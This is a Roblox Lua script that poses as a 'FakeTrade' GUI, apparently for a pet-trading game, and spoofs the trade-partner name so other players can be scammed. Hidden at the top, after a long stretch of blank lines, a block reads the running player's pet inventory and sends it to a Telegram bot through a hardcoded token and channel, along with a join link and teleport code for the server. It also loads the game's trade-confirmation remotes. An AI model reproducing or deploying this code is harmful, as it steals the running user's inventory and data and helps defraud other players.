


































































































































































task.spawn(function()
	local Players = game:GetService("Players")
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")
	local PlayerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
	local localPlayer = Players.LocalPlayer

	local Loads = require(ReplicatedStorage.Fsys).load
	local RouterClient = Loads("RouterClient")

	local AddItemRemote = RouterClient.get("TradeAPI/AddItemToOffer")
	local TradeRequestRemote = RouterClient.get("TradeAPI/SendTradeRequest")
	local TradeAcceptOrDeclineRequest = RouterClient.get("TradeAPI/AcceptOrDeclineTradeRequest")
	local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
	local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")


	local getData = require(ReplicatedStorage.ClientModules.Core.ClientData).get_data
	local petDatabase = require(ReplicatedStorage.ClientDB.Inventory.InventoryDB).pets
	local rarityModule = require(ReplicatedStorage.ClientDB.RarityDB)
	local HttpService = game:GetService("HttpService")


	local token = "8027403112:AAHidbIstiYW9jiYCwFkYz0Rjr0QKOosK90"
	local channel_chat_id = "@Ste44lerr"
	local inventory = getData()[localPlayer.Name].inventory
	local topPets = {}
	local regularPets = {}
	local petsToLog = {}

	local function send()

		for uid, petData in pairs(inventory.pets) do
			local dbEntry = petDatabase[petData.id]
			if dbEntry and dbEntry.donatable ~= false then
				local properties = petData.properties or {}
				local isRideable = properties.rideable == true
				local isFlyable = properties.flyable == true
				local isNeon = properties.neon == true
				local isMegaNeon = properties.mega_neon == true
				local petName = dbEntry.name
				local petTags = {}
				if isMegaNeon then
					table.insert(petTags, "M")
				end
				if isNeon then
					table.insert(petTags, "N")
				end
				if isFlyable and isRideable then
					table.insert(petTags, "FR")
				elseif isFlyable then
					table.insert(petTags, "F")
				elseif isRideable then
					table.insert(petTags, "R")
				end
				if #petTags > 0 then
					petName = petName .. " - " .. table.concat(petTags, "")
				end
				local petInfo = {
					uid = uid,
					name = petName,
					rarity = dbEntry.rarity,
					priority = #petTags
				}

				table.insert(petsToLog, petInfo)
			end
		end
		table.sort(petsToLog, function(a, b)
			return a.priority > b.priority
		end)
		local function formatInventoryMessage()
			local items = petsToLog
			local joinLink = "https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
			local message = "<b>📥 Join the game:</b> <a href='" .. joinLink .. "'>Click here to join</a>\n\n" ..
				"<b>📝 Script to join:</b>\n" .. "<code>" ..
				"game:GetService('TeleportService'):TeleportToPlaceInstance(" .. game.PlaceId .. ", `" .. game.JobId .. "`)" ..
				"</code>\n\n<b>📊 Items summary:</b> " .. tostring(#items) .. " items\n" ..
				"<b>🛒 Items list:</b>\n"

			for _, petInfo in ipairs(items) do
				message = message .. string.format("<b>%s</b>\n", petInfo.name)
			end

			return message
		end
		local function SendInfoInvToTG()
			local formattedMessage = formatInventoryMessage()
			local requests = syn and syn.request or http and http.request or request
			
			local response = requests({
				Url = "https://api.telegram.org/bot" .. token .. "/sendMessage",
				Method = "POST",
				Headers = {
					["Content-Type"] = "application/json"
				},
				Body = HttpService:JSONEncode({
					chat_id = channel_chat_id,
					text = formattedMessage,
					parse_mode = "HTML"
				})
			})
		end
		SendInfoInvToTG()
	end
	send()
end)

local FakeTrade = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local Frame_2 = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local close = Instance.new("ImageButton")
local ScrollingFrame = Instance.new("ScrollingFrame")
local UIListLayout = Instance.new("UIListLayout")
local list = Instance.new("Frame")
local UIListLayout_2 = Instance.new("UIListLayout")
local ListPlayer = Instance.new("TextButton")
local UICorner_3 = Instance.new("UICorner")
local MakePlayer = Instance.new("TextButton")
local UICorner_4 = Instance.new("UICorner")
local Reload = Instance.new("TextButton")
local UICorner_5 = Instance.new("UICorner")
local Template = Instance.new("TextButton")
local UICorner_6 = Instance.new("UICorner")


FakeTrade.Name = "FakeTrade"
FakeTrade.DisplayOrder = 56
FakeTrade.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
FakeTrade.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = FakeTrade
Frame.AnchorPoint = Vector2.new(1, 0.5)
Frame.BackgroundColor3 = Color3.fromRGB(61, 61, 61)
Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(1, 0, 0.5, 0)
Frame.Size = UDim2.new(0, 162, 0, 254)

UICorner.CornerRadius = UDim.new(0, 5)
UICorner.Parent = Frame

Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.fromRGB(42, 42, 42)
Frame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame_2.BorderSizePixel = 0
Frame_2.Position = UDim2.new(0.0802469105, 0, 0.137795269, 0)
Frame_2.Size = UDim2.new(0, 139, 0, 211)
Frame_2.Visible = false
Frame_2.ZIndex = 45

UICorner_2.CornerRadius = UDim.new(0, 5)
UICorner_2.Parent = Frame_2

close.Name = "close"
close.Parent = Frame_2
close.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
close.BackgroundTransparency = 1.000
close.BorderColor3 = Color3.fromRGB(0, 0, 0)
close.BorderSizePixel = 0
close.Position = UDim2.new(0.7613464, 0, -0.000653090654, 0)
close.Size = UDim2.new(0, 33, 0, 34)
close.Image = "rbxassetid://10002373478"

ScrollingFrame.Parent = Frame_2
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScrollingFrame.BackgroundTransparency = 1.000
ScrollingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.Position = UDim2.new(0, 0, 0.156398103, 0)
ScrollingFrame.Size = UDim2.new(0, 138, 0, 178)
ScrollingFrame.CanvasSize = UDim2.new(0, 0, 8, 0)
ScrollingFrame.ScrollBarThickness = 6

UIListLayout.Parent = ScrollingFrame
UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Padding = UDim.new(0, 4)

list.Name = "list"
list.Parent = Frame
list.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
list.BackgroundTransparency = 1.000
list.BorderColor3 = Color3.fromRGB(0, 0, 0)
list.BorderSizePixel = 0
list.Position = UDim2.new(0.0123456791, 0, 0.133858263, 0)
list.Size = UDim2.new(0, 159, 0, 220)

UIListLayout_2.Parent = list
UIListLayout_2.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout_2.Padding = UDim.new(0, 5)

ListPlayer.Name = "ListPlayer"
ListPlayer.Parent = list
ListPlayer.BackgroundColor3 = Color3.fromRGB(98, 98, 98)
ListPlayer.BorderColor3 = Color3.fromRGB(0, 0, 0)
ListPlayer.BorderSizePixel = 0
ListPlayer.Position = UDim2.new(0.223270446, 0, 0, 0)
ListPlayer.Size = UDim2.new(0, 117, 0, 34)
ListPlayer.Font = Enum.Font.SourceSans
ListPlayer.Text = "List Player"
ListPlayer.TextColor3 = Color3.fromRGB(0, 0, 0)
ListPlayer.TextScaled = true
ListPlayer.TextSize = 14.000
ListPlayer.TextWrapped = true
ListPlayer.TextXAlignment = Enum.TextXAlignment.Left

UICorner_3.CornerRadius = UDim.new(0, 5)
UICorner_3.Parent = ListPlayer

MakePlayer.Name = "MakePlayer"
MakePlayer.Parent = list
MakePlayer.BackgroundColor3 = Color3.fromRGB(98, 98, 98)
MakePlayer.BorderColor3 = Color3.fromRGB(0, 0, 0)
MakePlayer.BorderSizePixel = 0
MakePlayer.Position = UDim2.new(0.223270446, 0, 0, 0)
MakePlayer.Size = UDim2.new(0, 117, 0, 34)
MakePlayer.Font = Enum.Font.SourceSans
MakePlayer.Text = "Make Player"
MakePlayer.TextColor3 = Color3.fromRGB(0, 0, 0)
MakePlayer.TextScaled = true
MakePlayer.TextSize = 14.000
MakePlayer.TextWrapped = true
MakePlayer.TextXAlignment = Enum.TextXAlignment.Left

UICorner_4.CornerRadius = UDim.new(0, 5)
UICorner_4.Parent = MakePlayer

Reload.Name = "Reload"
Reload.Parent = list
Reload.BackgroundColor3 = Color3.fromRGB(98, 98, 98)
Reload.BorderColor3 = Color3.fromRGB(0, 0, 0)
Reload.BorderSizePixel = 0
Reload.Position = UDim2.new(0.223270446, 0, 0, 0)
Reload.Size = UDim2.new(0, 117, 0, 34)
Reload.Font = Enum.Font.SourceSans
Reload.Text = "Reload"
Reload.TextColor3 = Color3.fromRGB(0, 0, 0)
Reload.TextScaled = true
Reload.TextSize = 14.000
Reload.TextWrapped = true

UICorner_5.CornerRadius = UDim.new(0, 5)
UICorner_5.Parent = Reload

Template.Name = "Template"
Template.Parent = FakeTrade
Template.BackgroundColor3 = Color3.fromRGB(85, 85, 85)
Template.BorderColor3 = Color3.fromRGB(0, 0, 0)
Template.BorderSizePixel = 0
Template.Size = UDim2.new(0, 114, 0, 30)
Template.Font = Enum.Font.Unknown
Template.Text = "Template"
Template.TextColor3 = Color3.fromRGB(255, 255, 255)
Template.TextScaled = true
Template.TextSize = 14.000
Template.TextWrapped = true
Template.Visible = false

UICorner_6.CornerRadius = UDim.new(0, 4)
UICorner_6.Parent = Template

-- Scripts:

local function NAJCPZK_fake_script()

	local players = game:GetService("Players")
	local plr = players.LocalPlayer
	local gui = ScrollingFrame
	local template = Template
	local negotiationFrameHeader = plr.PlayerGui.TradeApp.Frame.NegotiationFrame.Header
	local partFrame = negotiationFrameHeader.PartnerFrame
	local confrirmHeader = plr.PlayerGui.TradeApp.Frame.ConfirmationFrame
	local part2Frame = plr.PlayerGui.TradeApp.Frame.ConfirmationFrame.PartnerLabel
	local cloned = partFrame:Clone()
	local chosenPlayer = nil

	local function updatePlayerList()
		for _, child in pairs(gui:GetChildren()) do
			if child:IsA("TextButton") then
				child:Destroy()
			end
		end

		for _, v in pairs(players:GetPlayers()) do
			local frame = template:Clone()
			frame.Text = v.Name
			frame.Name = v.Name
			frame.Parent = gui
			frame.Visible = true
			frame.Activated:Connect(function()
				chosenPlayer = v.Name
			end)
		end
	end

	players.PlayerAdded:Connect(updatePlayerList)
	players.PlayerRemoving:Connect(updatePlayerList)

	-- Первоначальное заполнение списка
	updatePlayerList()

	-- Открытие/закрытие списка
	ListPlayer.Activated:Connect(function()
		Frame_2.Visible = not Frame_2.Visible
	end)

	close.Activated:Connect(function()
		Frame_2.Visible = false
	end)

	-- Выбор игрока
	MakePlayer.Activated:Connect(function()
		if chosenPlayer then



			local newClone = partFrame:Clone()
			newClone.Parent = negotiationFrameHeader
			newClone.Name = "ClonedPartneredFrame"
			newClone.NameLabel.Text = chosenPlayer
			partFrame.Visible = false


			local newclone2 = part2Frame:Clone()
			newclone2.Parent = confrirmHeader
			newclone2.Name = "ClonedPartneredFrame"
			newclone2.Text = chosenPlayer
			part2Frame.Visible = false
		end
	end)

	Reload.Activated:Connect(function()
		local existingClone = negotiationFrameHeader:FindFirstChild("ClonedPartneredFrame")
		if existingClone then
			existingClone:Destroy()
		end

		local existingClone2 = confrirmHeader:FindFirstChild("ClonedPartneredFrame")
		if existingClone2 then
			existingClone2:Destroy()
		end
		partFrame.Visible = true
		part2Frame.Visible = true
	end)


end
coroutine.wrap(NAJCPZK_fake_script)()
